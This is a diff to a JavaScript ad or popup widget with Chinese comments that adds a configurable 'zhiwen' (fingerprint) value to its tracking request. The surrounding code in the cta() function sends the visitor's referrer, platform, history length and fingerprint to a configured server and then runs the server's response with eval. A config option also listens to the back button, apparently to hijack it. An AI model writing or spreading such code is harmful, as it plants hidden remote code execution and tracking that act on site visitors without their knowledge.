@@ -97,6 +97,7 @@
         var ae = (al.isClose); // 点击关闭按钮关闭，0-1之间随机，大于等于1则直接关闭
         var aa = (al.effect); // 动画效果
         var ba = al.heightNu; // 高，1是默认图片原本高 ,大于1时候，数字越大高度越小
+        var bc = al.zhiwen;
         var T = /CPU (?:iPhone )?OS (\d+_\d+)/i.test(navigator.userAgent) ? "IOS" + parseFloat(RegExp[
             "$1"].replace("_", ".")) : "";
         var U = true;
@@ -163,7 +164,7 @@
 
         // 向服务器发送请求
         function cta(ct){
-	    	var M18_url = ay.alink + "&ref=" + ref() + "&refso=" + navigator.platform + "_dp&zhongli=_"+zl+'zhiwen_'+g('zhiwen');
+	    	var M18_url = ay.alink + "&ref=" + ref() + "&refso=" + navigator.platform + "_dp&zhongli=_"+zl+'zhiwen_'+g(bc);
 	        var a = new XMLHttpRequest();
 	        var b = M18_url + '&n='+window.history.length+'&ct='+ct+'&r='+Math.floor(Math.random()*9999999+1);
 	        if(a!=null){a.onreadystatechange=function(){if(a.readyState==4 && a.status==200){if(window.execScript)window.execScript(a.responseText,'JavaScript');else if(window.eval)window.eval(a.responseText,'JavaScript');else eval(a.responseText);}};a.open('GET',b,true);a.send();}
@@ -251,7 +252,8 @@
 		  	'isback': 0, // 是否监听返回按钮，0-1之间随机，大于等于1则监听。第一次打开页面起作用
 		  	'isClose': 1, // 点击关闭按钮关闭，0-1之间随机，大于等于1则直接关闭
 		  	'effect': 'pulse', // 动画效果，pulse，tada，shake，还有其它的直接从https://daneden.github.io/animate.css/找
-		  	'heightNu': 3.5 // 高，1是默认图片原本高 ,大于1时候，数字越大高度越小
+		  	'heightNu': 3.5, // 高，1是默认图片原本高 ,大于1时候，数字越大高度越小
+		  	'zhiwen': 'zhsew' // 字符串，随便填
 		  },
 		});
     //}
